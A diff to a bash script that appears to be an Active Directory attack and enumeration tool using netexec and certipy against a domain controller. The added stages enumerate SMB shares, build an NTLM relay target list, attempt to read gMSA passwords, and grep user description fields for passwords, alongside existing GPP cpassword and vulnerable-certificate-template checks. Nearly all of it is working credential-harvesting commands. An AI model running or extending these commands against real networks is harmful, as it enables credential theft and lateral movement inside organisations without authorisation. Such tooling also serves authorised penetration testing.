@@ -37,7 +37,10 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/lib/hashmodes.sh"
 
 OUT="./ad-enum-out/${DC_IP}"
-mkdir -p "$OUT"
+if ! mkdir -p "$OUT"; then
+    echo "[!] Failed to create output directory: $OUT" >&2
+    exit 1
+fi
 echo "[*] Output directory: $OUT"
 
 MISSING=()
@@ -81,6 +84,11 @@ if [[ -n "$USER" && -n "$PASS" ]]; then
     echo
     echo "###### Authenticated stages (as $USER) ######"
 
+    if ! command -v nxc >/dev/null 2>&1; then
+        echo "[!] nxc (netexec) not found -- authenticated stages require it. pipx install git+https://github.com/Pennyw0rth/NetExec" >&2
+        exit 1
+    fi
+
     echo "[*] LDAP user listing"
     nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --users >"$OUT/ldap-users.log" 2>&1
 
@@ -101,8 +109,22 @@ if [[ -n "$USER" && -n "$PASS" ]]; then
         --query "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" "sAMAccountName" \
         >"$OUT/disabled-accounts.log" 2>&1
 
+    echo "[*] SMB share enumeration"
+    nxc smb "$DC_IP" -u "$USER" -p "$PASS" --shares >"$OUT/shares.log" 2>&1
+
+    echo "[*] SMB signing check (relay target list)"
+    nxc smb "$DC_IP" -u "$USER" -p "$PASS" --gen-relay-list "$OUT/relay-targets.txt" >"$OUT/smb-signing.log" 2>&1
+
     echo "[*] Delegation-trust listing"
     nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --trusted-for-delegation >"$OUT/delegation.log" 2>&1
+
+    echo "[*] gMSA password read attempt"
+    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --gmsa >"$OUT/gmsa.log" 2>&1
+
+    echo "[*] Description field password grep"
+    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" \
+        --query "(objectClass=user)" "sAMAccountName description" \
+        >"$OUT/user-descriptions.log" 2>&1
 
     echo "[*] GPP cpassword sweep"
     nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_password >"$OUT/gpp-password.log" 2>&1
@@ -116,7 +138,7 @@ if [[ -n "$USER" && -n "$PASS" ]]; then
 
     echo "[*] ADCS triage"
     nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M adcs >"$OUT/adcs-triage.log" 2>&1
-    if command -v certipy >/dev/null 2>&1 && grep -qi 'CA' "$OUT/adcs-triage.log" 2>/dev/null; then
+    if command -v certipy >/dev/null 2>&1 && grep -q 'Found PKI' "$OUT/adcs-triage.log" 2>/dev/null; then
         echo "  CA indicator found -- running certipy find -vulnerable"
         certipy find -u "${USER}@${DOMAIN}" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout >"$OUT/certipy-find.log" 2>&1
     fi
